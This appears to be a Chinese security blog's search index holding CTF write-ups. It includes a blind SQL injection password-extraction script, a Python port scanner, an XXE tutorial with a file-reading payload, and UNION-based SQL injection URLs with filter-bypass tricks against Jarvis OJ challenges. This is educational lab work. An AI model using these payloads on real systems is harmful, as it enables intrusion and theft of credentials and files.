'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''password = ''for i in range(1,51): for j in all_string: print('checking '+j) data = &#123; 'username':"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: password = password + j print('the '+str(i)+' place of password is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(password) 我们可以看出爆出了密码，解密skctf123456。 补充一下知识点：1.ord()函数主要用来返回对应字符的ascii码 1234&gt;&gt;&gt; ord("a")97&gt;&gt;&gt; chr(97)&gt; 'a 打印字符串 print (“His name is %s”%(“Aviad”)) 效果：打印整数 print (“He is %d years old”%(25)) 效果：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-scoket主机识别]]></title>
    <url>%2F2019%2F07%2F29%2Fpython-scoket%E4%B8%BB%E6%9C%BA%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[python脚本编写 1234567891011121314151617#!/usr/bin/python#coding=utf-8import socketdef portScan(ip,port): try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(ip,port) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is close"%(ip,port) finally: s.close()if __name__=="__main__": ip='192.168.19.1' port=8888888 portScan(ip,port) 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python#coding=utf-8import socketfrom threading import Threadfrom optparse import OptionParserdef portScan(ip,port): try: c=socket.socket(socket.AF_INET,socket.SOCK_STREAM) c.connect((ip,port)) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is closed"%(ip,port) finally: c.close()if __name__=="__main__": parser=OptionParser('usage: %prog -i &lt;target host&gt; -n &lt;network&gt; -p &lt;target port&gt;') parser.add_option('-i',type='string',dest='tgtIP',help='specify target host') parser.add_option('-n',type='string',dest='tgtnetwork',help='specify target network') parser.add_option('-p',type='string',dest='tgtport',help='specify target port') (options,args)=parser.parse_args() tgtIP=options.tgtIP tgtnetwork=options.tgtnetwork tgtport=options.tgtport if (tgtport == None or tgtIP==None and tgtnetwork==None): print parser.usage exit(0) tgtport=tgtport.split(',') if tgtIP: for p in tgtport: portScan(tgtIP,int(p)) if tgtnetwork: ip=tgtnetwork.split('.')[0] + '.' +tgtnetwork.split('.')[1] + '.' +tgtnetwork.split('.')[2] + '.' for i in range(1,255): try: IP=ip + str(i) for p in tgtport: t=Thread(target=portScan,args=(IP,int(p))) t.start() except KeyboardInterrupt: exit()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xxe漏洞详解]]></title>
    <url>%2F2019%2F07%2F29%2Fxxe%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 基础知识 XML基础知识XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。—-看了之后是不是很牛逼？高大上？其实百分之99的人看不懂。下面来点通俗的讲解： 简单概括的话就是，xml本身是一种格式规范，是一种包含了数据以及数据说明的文本格式规范。比如，我们要给对方传输一段数据，数据内容是“too young,too simple,sometimes naive”，要将这段话按照属性拆分为三个数据的话，就是，年龄too young，阅历too simple，结果sometimes naive。 我们都知道程序不像人，可以体会字面意思，并自动拆分出数据，因此，我们需要帮助程序做拆分，因此出现了各种各样的数据格式以及拆分方式。比如，可以是这样的数据为“too young,too simple,sometimes naive”然后按照逗号拆分，第一部分为年龄，第二部分为阅历，第三部分为结果。也可以是这样的数据为“too_young**too_simple*sometimes_naive”从数据开头开始截取前面十一个字符，去掉*号并把下划线替换为空格作为第一部分，再截取接下来的十一个字符同样去掉*并替换下划线为空格作为第二部分，最后把剩下的字符同样去*号体会空格作为第三部分。 这两种方式都可以用来容纳数据并能够被解析，但是不直观，通用性也不好，而且如果出现超过限定字数的字符串就容纳不了，也可能出现数据本身就下划线字符导致需要做转义。基于这种情况，出现了xml这种数据格式， 上面的数据用XML表示的话可以是这样 1234567&lt;person age="too young" experience="too simple" result="sometimes naive" /&gt;也可以是这样&lt;person&gt; &lt;age value="too young" /&gt; &lt;experience value="too simple" /&gt; &lt;result value="sometimes naive" /&gt;&lt;/person&gt; 两种方式都是xml，都很直观，附带了对数据的说明，并且具备通用的格式规范可以让程序做解析。如果用json格式来表示的话，就是下面这样{ “age”:”too young”, “experience”:”too simple”, “result”:”sometimes naive”}其实数据都是一样的，不同的只是数据的格式而已，同样的数据，我用xml格式传给你，你用xml格式解析出三个数据，用json格式传给你，你就用json格式解析出三个数据，还可以我本地保存的是xml格式的数据，我自己先解析出三个数据，然后构造成json格式传给你，你解析json格式，获得三个数据，再自己构造成xml格式保存起来，说白了，不管是xml还是json，都只是包装数据的不同格式而已，重要的是其中含有的数据，而不是包装的格式。 DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。内部声明DTD 根元素 [元素声明]&gt; 引用外部DTD 根元素 SYSTEM “文件名”&gt;或者根元素 PUBLIC “public_ID” “文件名”&gt;** //注意文件包含漏洞 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明实体 实体名称 “实体的值”&gt; 引用外部实体实体 名称 SYSTEM “URI”&gt; //注意ssrf漏洞 或者 实体名称 PUBLIC “public_ID” “URI”&gt; DTD基础知识在信息的高速交流中，不同领域之间的信息交换越来越紧密，如何才能保证这些不同领域之间的信息可以更容易且更有效率地交换成为我们首要关注的问题。为了解决这个问题，就需要不同的领域来针对领域的特性制定共同的信息内容模型（content model），然后再通过这个共同的内容模型来标识信息。而DTD就是一种内容模型。 DTD（文档类型定义）可以定义合法的XML文档结构，它使用一系列合法元素来定义文档的结构。DTD分为内部DTD和外部DTD，所谓内部DTD是指该DTD在某个文档的内部，只被该文档使用。外部DTD是指该DTD不在文档内部，可以被其他所有的文档来共享。DTD文档与XML文档实例的关系可以看成是类和对象的关系。 DTD的优势 每一个XML文档都可携带一个DTD，用来对该文档格式进行描述，测试该文档是否为有效的XML文档。既然DTD有外部和内部之分，当然就可以为某个独立的团体定义一个公用的外部DTD，那么多个XML文档就都可以共享使用该DTD，使得数据交换更为有效。甚至在某些文档中还可以使内部DTD和外部DTD相结合。在应用程序中也可以用某个DTD来检测接收到的数据是否符合某个标准。 对于XML文档而言，虽然DTD不是必须的，但它为文档的编制带来了方便。加强了文档标记内参数的一致性，使XML语法分析器能够确认文档。如果不使用DTD来对XML文档进行定义，那么XML语法分析器将无法对该文档进行确认。举个例子： 1234567&lt;stu id="a&amp;quot;0&amp;apos;0&amp;apos;1&amp;lt;" &gt;&lt;name&gt;杨过&lt;/name&gt;&lt;sex&gt;男&lt;/sex&gt;&lt;age&gt;30&lt;/age&gt;&lt;介绍&gt;我是好人&lt;/介绍&gt;&lt;面积&gt;100平&lt;/面积&gt;&lt;/stu&gt; xml过于自由。快速入门案例基本语法是: 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!--引入dtd去约束该xml文件--&gt;&lt;!DOCTYPE 班级 SYSTEM "myClass2.dtd"&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周星驰&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林青霞&lt;/名字&gt; &lt;年龄&gt;32&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt;&lt;/班级&gt; 123456myClass2.dtd&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 漏洞利用 XML外部实体注入(XML External Entity)当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 引入外部实体方式有多种，比如：恶意引入外部实体方式1：XML内容：恶意引入外部实体方式2：XML内容：DTD文件(evil.dtd)内容：恶意引入外部实体方式3：XML内容：DTD文件(evil.dtd)内容：另外，不同程序支持的协议不一样，上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有 12&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE root SYSTEM "http://www.test.org/test.dtd"&gt; 对于以上的一些代码我们做一些解释：DOCTYPE分析DTD声明始终以!DOCTYPE开头,空一格后跟着文档根元素的名称,如果是内部DTD,则再空一格出现[],在中括号中是文档类型定义的内容. 而对于外部DTD,则又分为私有DTD与公共DTD,私有DTD使用SYSTEM表示,接着是外部DTD的URL. 而公共DTD则使用PUBLIC,接着是DTD公共名称,接着是DTD的URL.下面是一些示例公共DTD,DTD名称格式为”注册//组织//类型 标签//语言”,”注册”指示组织是否由国际标准化组织(ISO)注册,+表示是,-表示不是.”组织”即组织名称,如:W3C; “类型”一般是DTD,”标签”是指定公开文本描述，即对所引用的公开文本的唯一描述性名称,后面可附带版本号。最后”语言”是DTD语言的ISO 639语言标识符,如:EN表示英文,ZH表示中文,在下面的地址有完整的ISO 639语言标识符列表[url]http://ftp.ics.uci.edu/pub/ietf/http/related/iso639.txt [/url] 以下举例说明XXE危害，当然XXE不止这些危害。XXE危害1：读取任意文件 该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。 另外，数据不回显就没有问题了吗？如下图， 不，可以把数据发送到远程服务器，远程evil.dtd文件内容如下：触发XXE攻击后，服务器会把文件内容发送到攻击者网站 XXE危害2：执行系统命令 该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 XXE危害3：探测内网端口 该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。 XXE危害4：攻击内网网站该CASE是攻击内网struts2网站，远程执行系统命令。 客户端XXE案例日前，某office文档转换软件被爆存在XXE漏洞（PS:感谢TSRC平台白帽子Titans)报告告漏洞），某一应用场景为：Web程序调用该office软件来获取office文档内容后提供在线预览。由于该软件在处理office文档时，读取xml文件且允许引用外部实体，当用户上传恶意文档并预览时触发XXE攻击。详情如下：新建一个正常文档，内容为Hi TSRC， 使用该软件转换后可以得到文本格式的文档内容， 当往该docx的xml文件注入恶意代码（引用外部实体）时，可进行XXE攻击。 防御XXE攻击 方案一、使用开发语言提供的禁用外部实体的方法PHP：libxml_disable_entity_loader(true); 其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 方案二、过滤用户提交的XML数据 关键词：，SYSTEM和PUBLIC。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis-OJ-api调用]]></title>
    <url>%2F2019%2F07%2F29%2FJarvis-OJ-api%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[面对这道题我完全小白，所以我必须详细解释。 基础知识 什么是php框架？框架思想就是提供一种可以在多个应用程序中使用的设计。所有应用程序都有大量通用的基本内容 —— 具体地说，就是某类与数据库的接口、某些应用程序逻辑、应用程序呈现给用户的内容等。如果您编写过许多 PHP 应用程序，则会知道这些基本内容是什么。您可能已经编写过一组函数或从数据库中读取数据和向数据库中写入数据的类，可能已经使用过诸如 Smarty 之类的模板引擎来管理 UI。而且一定编写过大量 PHP 代码来完成诸如分析表单提交并根据提交的数据作决定之类的事务。如果您已经编写过很多应用程序，则可能已经一次又一次地做过相同的基本工作，有时还会将一个应用程序中的代码借用到另一个应用程序中。 框架专门用于为这些常用元素(数据库交互、表示层、应用程序逻辑)提供结构，以便您可以花费更少的时间来编写数据库接口代码或者表示层接口，而花费更多的时间来编写应用程序本身。以这种方式分解应用程序，这种架构被称为模型-视图-控制器(Model-View-Controller，MVC)。模型 指数据，视图 指表示层，而控制器 指应用程序逻辑或业务逻辑。对 MVC 的完整讨论超出本文的范围，但是鼓励您研究 MVC 并深入了解 MVC 的一切(请参阅 参考资料)。 选择框架 每种语言几乎都有若干个框架可用。选择刚好满足需求的框架可能有点难，尤其是当您以前未曾使用过任何一个框架时更是如此。虽然熟悉此领域的同事和可信赖的 developerWorks 作者提供的建议和评价会十分有帮助，但是选择任何框架时实际上应当遵循的惟一一个指导原则是：框架为每个人 节省的时间和精力越多越好。如果一个框架工作得很好但是会导致产生大量支持调用，那就不是一个优秀框架。如果一个框架易于支持，但是起到的阻碍作用大于辅助开发作用，那也不是一个优秀框架。如果一个框架十分优雅，但是会导致出现支持问题和开发问题，那么这个框架也是没有用的。 选择项目框架时，考虑从上到下所有相关人员的意见，并且在评估框架时，考虑到对其他各方的影响。 当考虑采用一个框架时，请进一步审视您的应用程序，并思考该应用程序是不是需要一个框架。框架不是必需品。即使不使用框架，也可以继续编写企业应用程序。框架会对项目有帮助么?它是否会节省每个人的时间和精力?您的应用程序在框架中是否会执行得更好?它是否将提供所缺乏的稳定性?如果上面任意一个问题的答案为是，那么您应当考虑采用框架。如果所有这些问题的答案都为否，那么使用框架只会把事情变复杂。 什么是api？从文件操作开始谈API。以C语言为例，我们使用fopen()函数可以打开一个文件，感觉非常简单。文件保存在硬盘上，要经过复杂的处理才能显示，这些细节对我们来说是透明的，由操作系统完成。也就是说，我们调用fopen()函数来通知操作系统，让操作系统打开一个文件。那么，我们如何告诉操作系统打开文件呢？ 看似简单的操作到底层都非常复杂，打开文件首先要扫描硬盘，找到文件的位置，然后从文件中读取一部分数据，将数据放进I/O缓冲区，放进内存；这些数据都是0、1序列，还要对照ASCII表或Unicode表”翻译“成字符，再在显示器上显示出来。这个过程如果要让程序员来完成，那简直是噩梦！怎么办呢？操作系统想了一个很好的办法，它预先把这些复杂的操作写在一个函数里面，编译成一个组件（一般是动态链接库），随操作系统一起发布，并配上说明文档，程序员只需要简单地调用这些函数就可以完成复杂的工作，让编程变得简单有趣。这些封装好的函数，就叫做API(Application Programming Interface)，即应用程序编程接口。说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。 各种编程语言自带的标准库其实也是API。这些API由编程语言的开发者们编写，安全、高效、健壮，为我们实现了常见的功能，让我们不用再重复造轮子。C语言 API 以函数的形式呈现，例如 printf()、scanf()、fopen() 等。Java API 主要以类的形式呈现，例如 String、Thread、Date 等。C++ 是在C语言的基础上进行的扩展，所以 C++ API 既包含函数也包含类。第三方库（框架）libxml2——xml的c语言版库，2个项目使用过，win和Linux下都很犀利~~比较快捷CURL—— 这个用的主要是使用了他的封装的http和https的请求，比较犀利，其中包含了openssl的内容iconv——功能强大的编码格式转化库，UTF8，Unicode等互相转化很方便openssl——C的开源密库，可以进行证书加密和https的访问的模拟提交可以和CURL配合使用cocos2d——2D游戏引擎，相比较传统的UI自己控制的重画OpenCV——开源图像库还有很多第三方（非官方）的组织机构、公司、个人提供的代码，也是一种 API。这些代码有的免费，有的收费；有的开源，有的闭源。这些代码大都针对某个特定的应用领域编写，有时候被称为框架或者库。例如基于C语言的图形界面库GTK，基于C++的网络库ACE，基于Java的大数据处理平台Hadoop，基于Python的Web开发框架Django，基于JavaScript的前端开发框架React。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。 www和远程服务器当我想到网络的时候，我脑海中想象了一张巨大的连接服务网络每一张页面都储存在远程服务器中，而一个远程服务器并不是那么的神秘，他就是一部分用来优化请求过程的远程计算机。为了能让事情更透明，你可以在你一台可以服务整个网站到网络上的手提电脑上启动一个服务器（事实上，一个本地服务器就是在发布到公众上之前工程师需要开发网站：注：其实这句话我不是很理解，翻译得乱七八糟，原文是：a local server is what engineers use to develop websites before releasing them to the public）。当你键入www.facebook.com进入你的浏览器并回车的时候，一个请求就去到了faceboook的远程服务器。一旦你的浏览器接收到了响应，它就解析代码并展示页面。浏览器，也就是我们说的客户端 ，也可以不太严谨的说facebook的服务器就是个API ，这意味这每次你在网络上浏览网页的时候，你就和一些远程服务器的API发生了交互。一个API并不是等同于一整个远程服务器，他是服务器用来接受请求和发送响应的一部分 API就是一种为你客户提供服务的方法你可能听说过公司将API包做成一个产品，例如，”地下气象站“出售的就是它自己的气象数据API的 入口实例场景： 你的个人小型商业网站有一个给客户注册的预约表格，你想要给你的客户提供自动创建一个谷歌日历时间的能力。API 使用：这概念就是让你的网站服务器带着请求去创建一个具体的事件，你的服务器之后会接收到谷歌的响应，处理它，然后将有关信息发送回给你的浏览器，例如发送一个认证信息给你的用户。另外，你的浏览器会通过你的服务器经常直接发送API 请求到谷歌服务器。谷歌日历的API 和其他的远程服务器的API 究竟有什么不同。专业的说，不同之处在于他们的请求和响应的形式是不一样的。当你提交整个页面的时候，你的浏览器期待的是一种HTML格式的响应，这个响应里包含了一些描述性的代码，当谷歌日历API 响应的时候会返回一些数据，大多是类似与json的格式。如果你的网站服务器发出了个API 请求，那么你的网站服务器就变成了个客户端（类似与当你使用浏览器访问网站的时候你的浏览器就成了客户端一样），从用户的角度来说，API允许他们完成一些没有离开网站的动作。很多现代的网站都至少使用了一些第三方API。很多问题都有了第三方的解决方案了，无论是以函数库或者是服务的形式，使用第三方的解决方案现在已经逐渐变得更简单和更可靠。这是很常见的，开发团队将他们的应用分解到多个服务器里面，服务器通过API 相互交流。为主应用服务器提供辅助功能的服务器这方面的知识可以参考微型服务器。总得来说，当一个公司向它的用户提供了API 的时候，这就意味着他们建造了一系列的专用URL通道，用来返回纯数据形式的响应，意味这响应不会包含一些用于解释的额外开销，你期望的是一种像网站一样的图表用户界面。你的浏览器可以发送这种请求吗，当然可以，由于实际的HTTP传输都是以文本的形式进行的，你的浏览器总是能达到它能展示响应的最好状态。例如，你可以通过浏览器直接访问GitHub的API ，甚至根本不需要访问标记（=_= # 什么是访问标记…..)，当你用浏览器访问一个GitHub的用户API的时候，你将获得一个JSON形式的响应 A就是application作为结束，就多扔几个关于API 的事例吧“应用”可以指很多事情，在API 里面他指代的是： 1 :一个具有不同功能的软件 2：整个服务器，整个app，或者是app的一小部分基本上任何软件都可以从环境中有区别的分离开来，有可能在API 里成为A（也就是Application），也可能它本身就是某种API。假设你在你的代码里使用了第三方的函数库，一旦与你的代码结合了，一个函数路就成为了你真个APP里的一部分，成为软件中特殊的一部分，函数库很可能具有一个让你可以与你其他的代码相互沟通的API .这有其他的一些例子，在面对对象设计中，代码是被组织进对象的，你的应用程序可能是由上百个可以相互交流的类构成的,每个类都有一个API ，一系列公共方法和用于和其他类进行交流的的属性,一个类可能有内部的私有化属性，这意味这它是对外部环境隐藏的（不是一个API ）,在使用API 这个东西越来越普遍的今天，希望你看完本篇文章后会有更多的理解 JSONJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率 xxe漏洞详解此部分在我的博客有详细解说,一定要先看看去看 解题步骤 我们一开始看到一个登陆框，输入没什么反省，只是回显字段，后来我们抓包也没什么反映，但是我们在输入参数之后进行抓包，出现反映了。我们可以看到回显信息是json格式，而且content-type为application/json。application即为应用，api简称是啥应用程序编程接口，题目是啥api调用emmmmmmmm有点关系了。 关于content-type MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下：text/html ： HTML格式text/plain ：纯文本格式text/xml ： XML格式image/gif ：gif图片格式image/jpeg ：jpg图片格式image/png：png图片格式以application开头的媒体格式类型：application/xhtml+xml ：XHTML格式application/xml ： XML数据格式application/atom+xml ：Atom XML聚合格式application/json ： JSON数据格式application/pdf ：pdf格式application/msword ： Word文档格式application/octet-stream ： 二进制流数据（如常见的文件下载） 题目表述：请设法获得目标机器/home/ctf/flag.txt中的flag值。题目还出现了json，而且我们可以看到我们传入的数据以另一种的形式出现在下面，可以修改。这里使我们想到了xml，与xml相关的漏洞是什么？xee，xee原理我们已经了解过了所以我们开始获取flag。XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。 但是这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml,然后传入xml代码： 12345&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE abcd[&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;something&gt;&amp;any;&lt;/something&gt; ![eccc79ae19c21b84d284e8010b90b535.png](Jarvis-OJ-api调用/Image [4].png)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Jarvis-OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ IN A Mess]]></title>
    <url>%2F2019%2F07%2F27%2FJarvis-OJ-IN-A-Mess%2F</url>
    <content type="text"><![CDATA[查看源码发现index.phps文件，打开开始代码审计 1234567891011121314151617181920212223242526&lt;?phpif(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 代码解释：1.判断id参数存不存在，如果不存在跳转到index.php?id=12.获取三个变量id，a，b3.判断a变量中有没有’.’4.打开文件a,并且放到字符串r中5.1)data变量等于一个字符串2)id=03)b变量的长度大于54)ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。eregi函数对大小写不敏感。6.file_get_contents 函数返回字符串的结果，可以赋值给变量，也可以直接进行使用：返回结果直接使用的例子代码：echo file_get_contents(‘a.txt’);此语句直接显示a.txt的文件内容返回结果赋值给变量的例子代码：$s=file_get_contents(‘a.txt’);接下来可以对字符串变量$s进行使用，例如获取部分内容。 @符号用来屏蔽错误信息，当函数不存在或者包含文件不存在时，不会显示错误信息。 eregi存在%00截断，而substr没有，也就是说eregi如果第一个字符是%00，那它就跳过这个再检测。 123456789&lt; ?php if (ereg("c","abcdef"))&#123; //说明：判断abcdef中是否含有字母c echo "通过"; &#125;else&#123; echo "错误"; &#125; ?&gt; eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) 他的意思就是判断某个字符串中是否有1114，这个某个字符串就是111加上b的第一个字符。这个条件很容易满足，但是问题就在后面，它又要求b的第一个字符不等于四。前后矛盾啊。在这里我们使用00截断而且变量a的值是一个文件，不是一个字符串。因此我们就不能将对应的字符串传递给a，使得data为对应的字符串。在这里我们使用php伪协议。那么php伪协议到底什么呢？php://input 是个可以访问请求的原始数据的只读流。，我们的变量a必须是一个文件名字，但是我们总不能在部署服务器上搭建一个文件，所以这个协议在这里充当的作用就是一个衔接的作用，我们以post方式传递参数。id的值很显然不能为0，但是我们可以利用弱等于。那我们就开始构造payload：长度大于5其中有1114但是第四个不等等于4 http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。后面有个id，可能是sql注入？加个单引号’判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。 既然这样那么我们就开始苦逼的sql注入之路吧 一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)最后我我们得到的结果：被过滤：selectfrom没有被过滤：andwhereor/2//#(为了避免笔记对应的操作这里加一个/)information‘orderby我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈 这题很狗啊，双写绕过必须穿插，不能是selectselect. 真正的注入即将开始http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#三个字段。回显正常。4个字段回显不正常 http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content# flag得到了，那么我们现在就来总结一下吧。首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：可以看到与id=1的时候回显一样。我在不断的错误中发现了三种情况：1.正常回显2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Jarvis OJ wp</tag>
      </tags>
  </entry>
</search>
